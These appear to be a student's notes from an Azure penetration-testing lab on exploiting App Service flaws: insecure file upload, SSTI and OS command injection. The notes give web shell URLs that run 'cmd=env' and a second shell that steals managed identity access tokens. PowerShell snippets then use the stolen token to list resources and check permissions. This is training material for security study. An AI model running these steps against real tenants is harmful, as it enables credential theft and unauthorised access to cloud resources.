While there are default security features available with app service(Sandboxing/Isolation, encrypted communications), vulnerabilities in the code deployed are abusable.
Vulenrabilities like:
- SQL innnjection
- Insecure File Upload
- Injection Attacks

We will discuss the following 
- Insecure File upload
- Server Side Template Injection
- OS Command Injection

# Insecure File Upload
- by abusing an insecure file upload vulnerability in an App Service can lead to command execution. 
- the privileges will be of low-privilege worker process 
- But if the app service uses a Managed Identity, we may have the ability to have interesting permissions on other Azure resources.

After compromising an App Service, we can request access tokens for the managed identity.
- if the app service contains enviroment variables IDENTITY_HEADER and IDENTITY_ENDPOINT, it has managed identity: ` https://defcorphqcareer.azurewebsites.net/uploads/student<x>shell.phtml?cmd=env`

Get access Token for the managed identity using another web shell
- ` https://defcorphqcareer.azurewebsites.net/uploads/student<x>token.phtml `
Both Shells are in the Tools directory 

Check the resources available to the managed identity(using the access token and clientID)
```powershell
$token = <token>

Connect-AzAccount -AccessToken $token -AccountId <clientID>
Get-AzResource
```

Check the permissions of the managed idenitity on the virtual machine from above. 
```
$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Compute/virtualMachines/bkpadconnect/providers/Microsoft.Authorization\permissions?api-version=2025-07-01'

$RequestParameters = @{
	Method = 'GET'
	URI = $URI
	Headers = @{
		'Authorization' = "Bearer $token"
	}
}
(Invoke-RestMethod @RequestParameters).value
```
- note there should be no need to use the above code. `Get-AZRoleAssignment` gives the correct result in case  a user's token is used. But throws and error in case token of a Managed Identity


# Server Side Template Injection(SSTI)
- SSTI allows attackers to abuse template syntax to inject payloads in a template that is executed on the other side. 
- that is we can get command execution on a server by abusing this
- Please note again that for App Service, we get privileges of only the worker process but a managed identity may allow us access to other azure resources. 

# OS Command Injection
- allows us to run arbitrary operating system commands on the server where requests are processed 
- this is usually due to insecure parsing of user input such as parameters, uploaded files and HTTP requests
- Same as above for App Service, we get privileges of only the worker process but a managed identity may allow us access to other azure resources. 